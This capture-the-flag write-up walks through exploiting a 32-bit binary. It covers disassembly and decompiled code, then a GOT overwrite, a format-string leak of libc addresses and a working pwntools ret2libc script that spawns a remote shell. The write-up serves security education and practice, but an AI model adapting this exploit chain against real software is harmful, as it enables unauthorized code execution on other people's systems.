# Writeup

Step

- On running checksec

```bash
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

- On running <a id="strings">strings</a> , the interesting things seem to be
  this only

```bash
.
.
/bin/cat flag1
/bin/cat flag2
Enter 2nd Password:
250382
Good For You
Password matched.%s
Here's a hint: %x
Enter your name:
Now Enter password:
.
.
```

- In the objdump, we see three functions

  - `main`
  - `passedFirstHurdle`
  - `verification2`

## Objdump of `main`

```bash

08049357 <main>:
 8049357:       8d 4c 24 04             lea    ecx,[esp+0x4]
 804935b:       83 e4 f0                and    esp,0xfffffff0
 804935e:       ff 71 fc                push   DWORD PTR [ecx-0x4]
 8049361:       55                      push   ebp
 8049362:       89 e5                   mov    ebp,esp
 8049364:       53                      push   ebx
 8049365:       51                      push   ecx
 8049366:       83 ec 20                sub    esp,0x20
 8049369:       e8 f2 fd ff ff          call   8049160 <__x86.get_pc_thunk.bx>
 804936e:       81 c3 92 2c 00 00       add    ebx,0x2c92
 8049374:       83 ec 0c                sub    esp,0xc
 8049377:       6a 00                   push   0x0
 8049379:       e8 02 fd ff ff          call   8049080 <time@plt>
 804937e:       83 c4 10                add    esp,0x10
 8049381:       83 ec 0c                sub    esp,0xc
 8049384:       50                      push   eax
 8049385:       e8 26 fd ff ff          call   80490b0 <srand@plt>
 804938a:       83 c4 10                add    esp,0x10
 804938d:       e8 5e fd ff ff          call   80490f0 <rand@plt>
 8049392:       89 45 f4                mov    DWORD PTR [ebp-0xc],eax
 8049395:       c7 45 f0 00 00 00 00    mov    DWORD PTR [ebp-0x10],0x0
 804939c:       c7 45 e0 00 00 00 00    mov    DWORD PTR [ebp-0x20],0x0
 80493a3:       c7 45 e4 00 00 00 00    mov    DWORD PTR [ebp-0x1c],0x0
 80493aa:       c7 45 e8 00 00 00 00    mov    DWORD PTR [ebp-0x18],0x0
 80493b1:       c7 45 ec 00 00 00 00    mov    DWORD PTR [ebp-0x14],0x0
 80493b8:       8d 45 e0                lea    eax,[ebp-0x20]
 80493bb:       89 45 f0                mov    DWORD PTR [ebp-0x10],eax
 80493be:       83 ec 0c                sub    esp,0xc
 80493c1:       8d 83 78 e0 ff ff       lea    eax,[ebx-0x1f88]
 80493c7:       50                      push   eax
 80493c8:       e8 c3 fc ff ff          call   8049090 <puts@plt>
 80493cd:       83 c4 10                add    esp,0x10
 80493d0:       8b 83 f8 ff ff ff       mov    eax,DWORD PTR [ebx-0x8]
 80493d6:       8b 00                   mov    eax,DWORD PTR [eax]
 80493d8:       83 ec 0c                sub    esp,0xc
 80493db:       50                      push   eax
 80493dc:       e8 7f fc ff ff          call   8049060 <fflush@plt>
 80493e1:       83 c4 10                add    esp,0x10
 80493e4:       8b 83 f4 ff ff ff       mov    eax,DWORD PTR [ebx-0xc]
 80493ea:       8b 00                   mov    eax,DWORD PTR [eax]
 80493ec:       83 ec 04                sub    esp,0x4
 80493ef:       50                      push   eax
 80493f0:       6a 16                   push   0x16
 80493f2:       ff 75 f0                push   DWORD PTR [ebp-0x10]
 80493f5:       e8 76 fc ff ff          call   8049070 <fgets@plt>
 80493fa:       83 c4 10                add    esp,0x10
 80493fd:       8b 45 f4                mov    eax,DWORD PTR [ebp-0xc]
 8049400:       89 83 50 00 00 00       mov    DWORD PTR [ebx+0x50],eax
 8049406:       83 ec 0c                sub    esp,0xc
 8049409:       8d 83 89 e0 ff ff       lea    eax,[ebx-0x1f77]
 804940f:       50                      push   eax
 8049410:       e8 7b fc ff ff          call   8049090 <puts@plt>
 8049415:       83 c4 10                add    esp,0x10
 8049418:       8b 83 f8 ff ff ff       mov    eax,DWORD PTR [ebx-0x8]
 804941e:       8b 00                   mov    eax,DWORD PTR [eax]
 8049420:       83 ec 0c                sub    esp,0xc
 8049423:       50                      push   eax
 8049424:       e8 37 fc ff ff          call   8049060 <fflush@plt>
 8049429:       83 c4 10                add    esp,0x10
 804942c:       8b 83 f4 ff ff ff       mov    eax,DWORD PTR [ebx-0xc]
 8049432:       8b 00                   mov    eax,DWORD PTR [eax]
 8049434:       83 ec 04                sub    esp,0x4
 8049437:       50                      push   eax
 8049438:       6a 0a                   push   0xa
 804943a:       ff 75 f0                push   DWORD PTR [ebp-0x10]
 804943d:       e8 2e fc ff ff          call   8049070 <fgets@plt>
 8049442:       83 c4 10                add    esp,0x10
 8049445:       8b 83 f8 ff ff ff       mov    eax,DWORD PTR [ebx-0x8]
 804944b:       8b 00                   mov    eax,DWORD PTR [eax]
 804944d:       83 ec 0c                sub    esp,0xc
 8049450:       50                      push   eax
 8049451:       e8 0a fc ff ff          call   8049060 <fflush@plt>
 8049456:       83 c4 10                add    esp,0x10
 8049459:       83 ec 0c                sub    esp,0xc
 804945c:       8d 45 e0                lea    eax,[ebp-0x20]
 804945f:       50                      push   eax
 8049460:       e8 2b fc ff ff          call   8049090 <puts@plt>
 8049465:       83 c4 10                add    esp,0x10
 8049468:       b8 00 00 00 00          mov    eax,0x0
 804946d:       8d 65 f8                lea    esp,[ebp-0x8]
 8049470:       59                      pop    ecx
 8049471:       5b                      pop    ebx
 8049472:       5d                      pop    ebp
 8049473:       8d 61 fc                lea    esp,[ecx-0x4]
 8049476:       c3                      ret
 8049477:       66 90                   xchg   ax,ax
 8049479:       66 90                   xchg   ax,ax
 804947b:       66 90                   xchg   ax,ax
 804947d:       66 90                   xchg   ax,ax
 804947f:       90                      nop

```

```c
undefined4 main(void)

{
  uint __seed;
  undefined4 local_28;
  undefined4 local_24;
  undefined4 local_20;
  undefined4 local_1c;
  undefined4 *local_18;
  int local_14;
  undefined *local_10;

  local_10 = &stack0x00000004;
  __seed = time((time_t *)0x0);
  srand(__seed);
  local_14 = rand();
  local_28 = 0;
  local_24 = 0;
  local_20 = 0;
  local_1c = 0;
  local_18 = &local_28;
  puts("Enter your name:");
  fflush(stdout);
  fgets((char *)local_18,0x16,stdin);
  key = local_14;
  puts("Now Enter password: ");
  fflush(stdout);
  fgets((char *)local_18,10,stdin);
  fflush(stdout);
  puts((char *)&local_28);
  return 0;
}
```

- Initially the binary seems pretty innocent. fgets is being used and no format
  string vulnerabilty seems to be there in main function.
- There seems to be no calls whatsoever to any of the two other functions from
  main
- fgets is called with 0x16 on address(local_18) which is pointing to local28.
  If the input is stored from local28 and is 0x16(24) bytes it will go on and
  overwrite local18 as well. So there's a small overflow here . In next fgets,
  we're still using local18 variable which may have some arbitrary address had
  there been an overflow with last fgets call.

- Lets see whats happening by running the binary.

```bash
Enter your name:
Dipesh
Now Enter password:
idkabcdefgh
idkabcdef
```

- Now lets try to overflow.

```bash
Enter your name:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Now Enter password:
[1]    14093 segmentation fault (core dumped)
```

We get a segmentation fault. So there's definitely something we could do with
this.

- First lets see other functions and what they are doing

## Objdump of `passedTheFirstHurdle`

```bash
080492e3 <passedFirstHurdle>:
 80492e3:       55                      push   ebp
 80492e4:       89 e5                   mov    ebp,esp
 80492e6:       53                      push   ebx
 80492e7:       83 ec 04                sub    esp,0x4
 80492ea:       e8 71 fe ff ff          call   8049160 <__x86.get_pc_thunk.bx>
 80492ef:       81 c3 11 2d 00 00       add    ebx,0x2d11
 80492f5:       83 ec 0c                sub    esp,0xc
 80492f8:       ff 75 08                push   DWORD PTR [ebp+0x8]
 80492fb:       e8 00 fe ff ff          call   8049100 <printf@plt>
 8049300:       83 c4 10                add    esp,0x10
 8049303:       8b 83 f8 ff ff ff       mov    eax,DWORD PTR [ebx-0x8]
 8049309:       8b 00                   mov    eax,DWORD PTR [eax]
 804930b:       83 ec 0c                sub    esp,0xc
 804930e:       50                      push   eax
 804930f:       e8 4c fd ff ff          call   8049060 <fflush@plt>
 8049314:       83 c4 10                add    esp,0x10
 8049317:       8b 93 50 00 00 00       mov    edx,DWORD PTR [ebx+0x50]
 804931d:       8b 83 ec ff ff ff       mov    eax,DWORD PTR [ebx-0x14]
 8049323:       31 d0                   xor    eax,edx
 8049325:       83 ec 08                sub    esp,0x8
 8049328:       50                      push   eax
 8049329:       8d 83 64 e0 ff ff       lea    eax,[ebx-0x1f9c]
 804932f:       50                      push   eax
 8049330:       e8 cb fd ff ff          call   8049100 <printf@plt>
 8049335:       83 c4 10                add    esp,0x10
 8049338:       8b 83 f8 ff ff ff       mov    eax,DWORD PTR [ebx-0x8]
 804933e:       8b 00                   mov    eax,DWORD PTR [eax]
 8049340:       83 ec 0c                sub    esp,0xc
 8049343:       50                      push   eax
 8049344:       e8 17 fd ff ff          call   8049060 <fflush@plt>
 8049349:       83 c4 10                add    esp,0x10
 804934c:       e8 d5 fe ff ff          call   8049226 <verification2>
 8049351:       90                      nop
 8049352:       8b 5d fc                mov    ebx,DWORD PTR [ebp-0x4]
 8049355:       c9                      leave
 8049356:       c3                      ret
```

- We see a printf calls, fflush and then a call to another function
  `verification2`

<a id="fstringvuln">.</a>

- Also we can see that this function would take in an argument and print it with
  printf.

```bash
 80492f8:       ff 75 08                push   DWORD PTR [ebp+0x8]
 80492fb:       e8 00 fe ff ff          call   8049100 <printf@plt>
```

```text
ebp+0x8
-----
ebp+0x4 - return address of current frame
-----
ebp of last stack frame
----- current frame's ebp
.
.
.
.
----- esp

```

- We can never really enter this function with normal flow of execution
- So we cant check what printing and all is happening here because we dont enter
  this call at all.
- Now lets see what happens in `verification2` which does get called from this
  function.

## Objdump of `verification2`

```bash
08049226 <verification2>:
 8049226:       55                      push   ebp
 8049227:       89 e5                   mov    ebp,esp
 8049229:       53                      push   ebx
 804922a:       83 ec 14                sub    esp,0x14
 804922d:       e8 2e ff ff ff          call   8049160 <__x86.get_pc_thunk.bx>
 8049232:       81 c3 ce 2d 00 00       add    ebx,0x2dce
 8049238:       83 ec 04                sub    esp,0x4
 804923b:       6a 14                   push   0x14
 804923d:       8d 83 26 e0 ff ff       lea    eax,[ebx-0x1fda]
 8049243:       50                      push   eax
 8049244:       6a 01                   push   0x1
 8049246:       e8 85 fe ff ff          call   80490d0 <write@plt>
 804924b:       83 c4 10                add    esp,0x10
 804924e:       8b 83 f8 ff ff ff       mov    eax,DWORD PTR [ebx-0x8]
 8049254:       8b 00                   mov    eax,DWORD PTR [eax]
 8049256:       83 ec 0c                sub    esp,0xc
 8049259:       50                      push   eax
 804925a:       e8 01 fe ff ff          call   8049060 <fflush@plt>
 804925f:       83 c4 10                add    esp,0x10
 8049262:       83 ec 04                sub    esp,0x4
 8049265:       6a 10                   push   0x10
 8049267:       6a 00                   push   0x0
 8049269:       8d 45 e8                lea    eax,[ebp-0x18]
 804926c:       50                      push   eax
 804926d:       e8 6e fe ff ff          call   80490e0 <memset@plt>
 8049272:       83 c4 10                add    esp,0x10
 8049275:       83 ec 04                sub    esp,0x4
 8049278:       68 00 01 00 00          push   0x100
 804927d:       8d 45 e8                lea    eax,[ebp-0x18]
 8049280:       50                      push   eax
 8049281:       6a 00                   push   0x0
 8049283:       e8 c8 fd ff ff          call   8049050 <read@plt>
 8049288:       83 c4 10                add    esp,0x10
 804928b:       83 ec 08                sub    esp,0x8
 804928e:       8d 83 3b e0 ff ff       lea    eax,[ebx-0x1fc5]
 8049294:       50                      push   eax
 8049295:       8d 45 e8                lea    eax,[ebp-0x18]
 8049298:       50                      push   eax
 8049299:       e8 a2 fd ff ff          call   8049040 <strcmp@plt>
 804929e:       83 c4 10                add    esp,0x10
 80492a1:       85 c0                   test   eax,eax
 80492a3:       75 2f                   jne    80492d4 <verification2+0xae>
 80492a5:       83 ec 08                sub    esp,0x8
 80492a8:       8d 83 42 e0 ff ff       lea    eax,[ebx-0x1fbe]
 80492ae:       50                      push   eax
 80492af:       8d 83 4f e0 ff ff       lea    eax,[ebx-0x1fb1]
 80492b5:       50                      push   eax
 80492b6:       e8 45 fe ff ff          call   8049100 <printf@plt>
 80492bb:       83 c4 10                add    esp,0x10
 80492be:       8b 83 f8 ff ff ff       mov    eax,DWORD PTR [ebx-0x8]
 80492c4:       8b 00                   mov    eax,DWORD PTR [eax]
 80492c6:       83 ec 0c                sub    esp,0xc
 80492c9:       50                      push   eax
 80492ca:       e8 91 fd ff ff          call   8049060 <fflush@plt>
 80492cf:       83 c4 10                add    esp,0x10
 80492d2:       eb 0a                   jmp    80492de <verification2+0xb8>
 80492d4:       83 ec 0c                sub    esp,0xc
 80492d7:       6a 00                   push   0x0
 80492d9:       e8 c2 fd ff ff          call   80490a0 <exit@plt>
 80492de:       8b 5d fc                mov    ebx,DWORD PTR [ebp-0x4]
 80492e1:       c9                      leave
 80492e2:       c3                      ret
```

```c
void verification2(void)

{
  int iVar1;
  char local_1c [20];

  write(1,"Enter 2nd Password: ",0x14);
  fflush(stdout);
  memset(local_1c,0,0x10);
  read(0,local_1c,0x100);
  iVar1 = strcmp(local_1c,"250382");
  if (iVar1 == 0) {
    printf("Password matched.%s\n","Good For You");
    fflush(stdout);
    return;
  }
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

- There is a very huge overflow here. We can pretty much write what we want on
  the stack with that much buffer size. But since this binary doesnt allow
  execution on the stack(by running `checksec`), we can discard the possibility
  of injecting shellcode. Its probably something else. We can also see what the
  expected password is.

## Exploit

- We have figured out that there is a vulnerability in fgets call in main that
  we can exploit. To even get close to the flag we first need to see what stuff
  is happening inside the other two functions, we need to know what they are
  printing. And since the first fgets call allows us to write `0x16 bytes`(6
  illegal bytes) and then there's another similar fgets call with the same
  pointer(which is very much vulnerable), we could write to arbitrary address
  with this if we give our first input suitably.

```python
from pwn import *
# The binary asked Name and Password
Filename = './TwoStepVerification'  # Put filename


def gotHijack() -> None:
    Name = 'a'*16+"\x20\xc0\x04\x08"
    Password = "\xe3\x92\x04\x08"
    p = process(Filename)
    p.sendline(Name)
    p.sendline(Password)
    p.interactive()


gotHijack()
```

- Output

```bash
[+] Starting local process './TwoStepVerification': pid 16505
[*] Switching to interactive mode
Enter your name:
Now Enter password:
aaaaaaaaaaaaaaaa \xc

Here's a hint: ec386dfa
Enter 2nd Password: $ Ok
[*] Got EOF while reading in interactive
```

We see our first input getting printed(the first fgets input) and after that,
some hex value being printed and its telling us its very useful . And after that
we are being asked to input 2nd password. Judging from what we know, this 2nd
password is probably being asked by the `verification2` function call.

It seems that the string that was supposed to be printed by the puts call is
being passed as an argument after that GOT hijack, And since the function prints
the argument passed to it(observed in the objdump), thats what seems to be
happening.

```c
void passedFirstHurdle(char *param_1)

{
  printf(param_1);
  fflush(stdout);
  printf("\nHere\'s a hint: %x\n",key ^ (uint)printf);
  fflush(stdout);
  verification2();
  return;
}
```

- The hex value printed seems to be address of printf ^ key and key is a random
  number which was set in main(). Also in main, we can see that it was seeded
  rand() cal with time(0). So its sure to change everytime. Also we know the 2nd
  password is 250382. From verification2 decompiled code, we can see it does
  nothing except print when we match the password.
- We're given printf address xor'd with some random number. So Im assuming this
  is probably hinting towards a libc related exploit.
- We could probably do ret2libc here from the verification2's overflow.

- But to do that, we need that random number to get printf's actual address
  first.

- What we were doing was overwriting `puts` with `passedFirstHurdle` and while
  doing so the thing that was supposed to be printed by puts call was also
  getting passed as argument to the `passedFirstHurdle` call. And if we see what
  `puts` was supposed to print, it turns out to be the first input that we gave.
  And it seems to be getting printed by printf without loading a format string,
  so we have here a format string vulnerability(as we have full control over the
  string that gets passed to printf). Since the random number is first assigned
  to a temporary in main() and then assigned to key, we can probably leak it.

- One libc address is technically not enough to find out the exact libc version
  used so we might need another one.

- After playing around with the binary in gdb , we can find out where in memory
  , key's value(in the temporary variable) and main() functions return
  address(which is also a libc address (`__libc_start_main+some_offset`, the
  offset can be different on different systems.)).

- To check for libc version, we can use <a href="https://libc.rip" >this</a>, we
  would need two dynamically loaded addresses along with their function names
  and this gives us the the libc version that would have these two functions
  with the same offset.

- Whatever address we get we can put it in this script and find the libc version
  that is being used.

- findlibc.sh

```bash
Address=0xf7d45ee5 # __libc_start_main+offset address
for i in $(seq 200 300); do
	val=`ruby -e "puts ($Address - $i).to_s(16)"`
	val2=`ruby -e "puts ($Address - $i).to_s(16)[3..]"`
	echo "FOR $val,$val2, $i"
    ## put printf's address inside as value of "printf"
	body=$(printf '{"symbols":{"__libc_start_main":"%s","printf":"0xf7d7b340"}}' $val2)
	echo $body
	curl -X POST -H 'Content-Type: application/json' --data \
		$body \
		 'https://libc.rip/api/find'
 done

```

- We can chain multiple libc addresses together and carefully inject them with
  the overflow and then get a shell.

```python
from pwn import *
import struct


def f(a: int) -> bytes:
    return struct.pack('I', a)


# From objdump -d -Mintel
AddressOfPuts = 0x804c020
AddressOfPassedFirstHurdle = 0x80492e3
Name = ("AA%19$8x..%23$8x").encode() + f(AddressOfPuts)
Password = f(AddressOfPassedFirstHurdle)
Filename = ''

host = ''
port = ''


def main() -> None:
    p = remote(host, port, timeout=None)
    #  p = process(Filename)
    p.sendline(Name)
    p.sendline(Password)
    [print(p.recvline()) for _ in range(0, 2)]
    start_main = p.recv(20).decode()
    print(start_main)

    # Libc 2.31 // from libc.rip
    offsetForSh = 0x192352
    offsetForExit = 0x38170
    offsetForSystem = 0x45830
    offsetForstart_main = 0x1edf0
    libc_main_plus_x = 245

    start_main = "0x"+start_main.strip()[12:]
    addressOfLibc = (int(start_main, 16) - libc_main_plus_x) - \
        offsetForstart_main
    addressOfSh = addressOfLibc + offsetForSh
    addressOfExit = addressOfLibc + offsetForExit
    addressOfSystem = addressOfLibc + offsetForSystem

    payload = ("250382\x00" + 'A' * 21).encode() + \
        f(addressOfSystem) + f(addressOfExit) + f(addressOfSh) + f(0)
    p.sendline(payload)
    p.interactive()


main()
```

- We get a shell and we do `cat flag` and we get our flag.

p_ctf{Tw0_5t6p_v3rlflc4ti0n_i5_n0_m4tch_f0r_h4ck3r_5upr3m3}
